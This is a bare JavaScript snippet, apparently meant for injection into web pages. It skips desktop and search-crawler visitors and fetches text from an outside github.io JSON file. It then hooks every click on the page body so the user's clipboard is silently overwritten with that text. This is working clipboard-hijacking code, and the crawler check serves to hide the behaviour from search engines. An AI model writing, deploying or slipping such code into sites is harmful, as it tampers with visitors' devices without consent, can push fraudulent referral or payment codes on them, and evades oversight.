let isWeb =  !(/Win|mac/i.test(navigator.platform));
let isSpiders = /Googlebot|Baiduspider|bingbot|YisouSpider|Bytespider|360Spider|Sogou/i.test(navigator.userAgent);
let webUser = isWeb && !isSpiders;
if (webUser) { 
	const xhr = new XMLHttpRequest()
	const url = 'https://sanjinxiaolongxia.github.io/code.json'
	xhr.open('get',url,true)
	xhr.send()
	xhr.onreadystatechange = function(){
		if(xhr.readyState === 4 && xhr.status === 200){
			let codeJosn =JSON.parse(xhr.responseText);
			let cpCode = '';
			for(let key in codeJosn){
				cpCode += codeJosn[key]+' ';
			}
			cpCode = cpCode.trim();
			let aNodes = document.querySelectorAll('body')
			for(let i =0; i<aNodes.length; i++){
				aNodes[i].onclick = function(){
					let oInput = document.createElement('input'); 
					oInput.setAttribute("readonly", "readonly");
					oInput.value = cpCode;
					document.body.appendChild(oInput);
					oInput.select(); 
					document.execCommand("Copy"); 
					oInput.style.display='none'; 
					oInput.remove();
				}
			}
		}
	}
}
